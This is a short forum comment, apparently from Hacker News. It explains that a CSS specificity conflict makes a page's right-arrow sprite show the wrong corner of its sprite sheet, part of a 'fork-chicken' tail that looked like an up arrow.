The left arrow is working correctly, but for the right arrow the specificity of their selectors is a bit messed up. The right arrow has a background-position that should select the bottom right corner of the sprite sheet, but this particular rule is getting overriden by a background: in a more specific selector that makes it use the top left corner (0 0) instead. And that top left corner happens to include the top of the fork-chicken&#x27;s tail, which was looking like an up arrow to me.<p>I guess the moral of the story is if you&#x27;re going to do this kind of fancy presentation, there are a lot of things that can go wrong!",1390804076
